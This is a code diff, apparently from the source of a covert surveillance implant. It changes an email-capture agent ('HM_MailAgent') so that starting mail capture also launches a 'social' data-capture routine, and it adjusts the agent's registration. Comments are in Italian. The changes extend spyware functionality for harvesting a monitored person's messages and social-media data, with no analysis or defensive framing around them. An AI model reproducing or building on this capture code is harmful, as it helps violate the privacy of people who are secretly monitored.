@@ -1,11 +1,12 @@
 #include "HM_MailAgent/MailAgent.h"
 
 #define MAIL_SLEEP_TIME 200000 //millisecondi 
+extern void StartSocialCapture(); // Per far partire le opzioni "social"
 
 // Globals
 BOOL g_bMailForceExit = FALSE;		// Semaforo per l'uscita del thread (e da tutti i clicli nelle funzioni chiamate)
-BOOL bPM_MailCapStarted = FALSE;	// Indica se l'agente e' attivo o meno
 HANDLE hMailCapThread = NULL;		// Thread di cattura
+//BOOL bPM_MailCapStarted;			// Indica se l'agente e' attivo o meno
 mail_filter_struct g_mail_filter;	// Filtri di cattura usati dal thread
 
 
@@ -57,6 +58,11 @@ DWORD __stdcall PM_MailCapStartStop(BOOL bStartFlag, BOOL bReset)
 	if (bStartFlag) {
 		// Crea il thread che cattura le mail
 		hMailCapThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CaptureMailThread, NULL, 0, &dummy);
+
+		// Fa partire il processo per la cattura dei dati socia.
+		// Se inserisco una opzione per abilitare o meno la cattura dei social,
+		// questa funzione va chiamata solo se l'opzione e' attiva.
+		StartSocialCapture();
 	} else {
 		// All'inizio non si stoppa perche' l'agent e' gia' nella condizione
 		// stoppata (bPM_SnapShotStarted = bStartFlag = FALSE)
@@ -100,5 +106,6 @@ DWORD __stdcall PM_MailCapUnregister()
 
 void PM_MailCapRegister()
 {
+	bPM_MailCapStarted = FALSE;
 	AM_MonitorRegister(L"messages", PM_MAILAGENT, NULL, (BYTE *)PM_MailCapStartStop, (BYTE *)PM_MailCapInit, (BYTE *)PM_MailCapUnregister);
 }
